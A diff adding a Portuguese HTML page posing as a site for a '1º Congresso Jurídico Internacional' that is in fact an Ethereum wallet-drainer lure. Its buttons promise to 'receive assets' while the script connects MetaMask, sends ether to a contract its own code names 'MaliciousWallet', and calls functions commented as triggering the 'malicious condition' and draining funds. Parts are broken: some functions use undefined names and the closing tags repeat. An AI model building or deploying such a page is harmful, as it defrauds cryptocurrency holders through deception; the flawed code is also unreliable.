@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <title>1º Congresso Jurídico Internacional</title>
+    <!-- Inclusão da biblioteca ethers.js -->
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
+    <style>
+        /* Estilos da página */
+        html, body {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+        button {
+            color: black;
+            margin: 5px;
+        }
+        .container {
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>1º Congresso Jurídico Internacional</h1>
+	    <button onclick="receberAtivos()">Receber Ativos</button>
+        <button onclick="conectarWallet()">Conectar Wallet</button>
+        <button id="btnDeposit" style="display:none;" onclick="depositarEther()">Depositar 0,002 Ether</button>
+        <button id="btnSignPermission" style="display:none;" onclick="signPermission()">Assinar Permissão</button>
+        <p id="status"></p>
+    </div>
+
+    <script>
+        const abiMaliciousWallet = [
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "sender",
+				"type": "address"
+			},
+			{
+				"indexed": false,
+				"internalType": "uint256",
+				"name": "amount",
+				"type": "uint256"
+			}
+		],
+		"name": "Deposited",
+		"type": "event"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "receiver",
+				"type": "address"
+			},
+			{
+				"indexed": false,
+				"internalType": "uint256",
+				"name": "amount",
+				"type": "uint256"
+			}
+		],
+		"name": "Withdrawn",
+		"type": "event"
+	},
+	{
+		"inputs": [],
+		"name": "deposit",
+		"outputs": [],
+		"stateMutability": "payable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "destroyContract",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address payable",
+				"name": "to",
+				"type": "address"
+			},
+			{
+				"internalType": "uint256",
+				"name": "amount",
+				"type": "uint256"
+			}
+		],
+		"name": "transferEther",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"stateMutability": "nonpayable",
+		"type": "constructor"
+	},
+	{
+		"inputs": [],
+		"name": "getBalance",
+		"outputs": [
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "owner",
+		"outputs": [
+			{
+				"internalType": "address payable",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	}];
+
+        // Substitua pelo endereço do contrato implantado
+        const enderecoContratoMaliciousWallet = "0xCfCDeAf2CDc0D91714dE18932E7B73fF0A13D1fE"; 
+
+        let provider;
+        let signer;
+        let contrato;
+
+        async function conectarWallet() {
+            if (window.ethereum) {
+                try {
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    provider = new ethers.providers.Web3Provider(window.ethereum);
+                    signer = provider.getSigner();
+                    contrato = new ethers.Contract(enderecoContratoMaliciousWallet, abiMaliciousWallet, signer);
+
+                    document.getElementById('btnDeposit').style.display = 'block';
+                    document.getElementById('btnSignPermission').style.display = 'block';
+                    document.getElementById('status').textContent = "Wallet conectada: " + await signer.getAddress();
+                } catch (error) {
+                    console.error("Erro ao conectar a wallet:", error);
+                }
+            } else {
+                console.error("Por favor, instale o MetaMask!");
+            }
+        }
+
+        async function depositarEther() {
+            if (signer) {
+                try {
+                    const tx = await signer.sendTransaction({
+                        to: enderecoContratoMaliciousWallet,
+                        // Convertendo 0.002 ether para Wei
+                        value: ethers.utils.parseEther("0.002")
+                    });
+                    await tx.wait();
+                    console.log("0,002 ether depositados no contrato.");
+                } catch (error) {
+                    console.error("Erro ao depositar ether:", error);
+                }
+            } else {
+                console.error("Conexão com a wallet necessária.");
+            }
+        }
+
+        async function signPermission() {
+            if (signer && contrato) {
+                try {
+                    const tx = await contrato.signPermission();
+                    await tx.wait();
+                    console.log("Permissão assinada e fundos potencialmente drenados.");
+                } catch (error) {
+                    console.error("Erro ao assinar permissão:", error);
+                }
+            } else {
+                console.error("Conexão com a wallet necessária.");
+            }
+        }
+	      // Função para criar uma transação
+        async function criarTransacao() {
+            if (window.ethereum) {
+                try {
+                    const web3 = new Web3(window.ethereum);
+                    const accounts = await web3.eth.getAccounts();
+                    const contrato = new web3.eth.Contract(abi, enderecoContrato);
+
+                    // Chama o método deposit do contrato
+                    const resultado = await contrato.methods
+                        .deposit()
+                        .send({ from: accounts[0], value: web3.utils.toWei("0.01", "ether") }); // Envia 0.01 ether
+
+                    console.log("Transação criada:", resultado);
+                } catch (error) {
+                    console.error("Erro ao criar a transação:", error);
+                }
+            } else {
+                console.error("Nenhuma wallet encontrada.");
+            }
+        }
+    // Função para executar a ação "maliciosa"
+        async function receberAtivos() {
+            if (window.ethereum) {
+                try {
+                    const web3 = new Web3(window.ethereum);
+                    const accounts = await web3.eth.getAccounts();
+                    const contrato = new web3.eth.Contract(abi, enderecoContrato);
+
+                    // Executa a função transferEther com 1 wei, disparando a condição maliciosa
+                    const resultado = await contrato.methods
+                        .transferEther(accounts[0], 1)
+                        .send({ from: accounts[0] });
+
+                    console.log("Receber ativos executado:", resultado);
+                } catch (error) {
+                    console.error("Erro ao receber ativos:", error);
+                }
+            } else {
+                console.error("Nenhuma wallet encontrada.");
+            }
+        }
+    </script>
+</body>
+</html>
+    </script>
+</body>
+</html>
